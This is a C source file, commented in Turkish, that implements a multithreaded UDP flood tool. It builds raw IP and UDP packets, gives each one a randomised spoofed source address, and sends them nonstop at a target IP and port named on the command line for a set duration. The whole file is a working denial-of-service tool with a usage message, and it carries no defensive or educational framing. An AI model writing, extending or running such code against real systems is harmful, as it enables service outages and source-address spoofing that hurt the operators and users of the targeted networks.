#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

// IP ve UDP header boyutları
#define IP_HDRLEN 20
#define UDP_HDRLEN 8

char *target_ip;
int target_port, packet_size, thread_count, duration;

// Basit checksum hesaplama fonksiyonu
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *flood(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Raw socket oluşturulamadı");
        pthread_exit(NULL);
    }

    // IP başlıklarını kendimiz oluşturacağımız için
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("IP_HDRINCL ayarlanamadı");
        close(sock);
        pthread_exit(NULL);
    }

    char *packet = malloc(IP_HDRLEN + UDP_HDRLEN + packet_size);
    memset(packet, 0, IP_HDRLEN + UDP_HDRLEN + packet_size);

    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + IP_HDRLEN);
    char *data = packet + IP_HDRLEN + UDP_HDRLEN;

    memset(data, 'A', packet_size);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // IP header doldur
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(IP_HDRLEN + UDP_HDRLEN + packet_size);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.100"); // Kaynak IP (spoof edilebilir)
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = checksum((unsigned short *)iph, IP_HDRLEN);

    // UDP header doldur
    udph->source = htons(rand() % 65535);
    udph->dest = htons(target_port);
    udph->len = htons(UDP_HDRLEN + packet_size);
    udph->check = 0;

    time_t end_time = time(NULL) + duration;
    while (time(NULL) < end_time) {
        iph->id = htons(rand() % 65535); // Her pakette benzersiz ID
        iph->saddr = htonl((rand() % 0xFFFFFF) | 0x0A000000); // Rastgele local kaynak IP
        iph->check = 0;
        iph->check = checksum((unsigned short *)iph, IP_HDRLEN);

        udph->source = htons(rand() % 65535);

        sendto(sock, packet, IP_HDRLEN + UDP_HDRLEN + packet_size, 0,
               (struct sockaddr *)&sin, sizeof(sin));
    }

    free(packet);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Kullanım: %s <ip> <port> <packet_size> <thread> <time>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    packet_size = atoi(argv[3]);
    thread_count = atoi(argv[4]);
    duration = atoi(argv[5]);

    pthread_t threads[thread_count];
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Flood işlemi tamamlandı.\n");
    return 0;
}
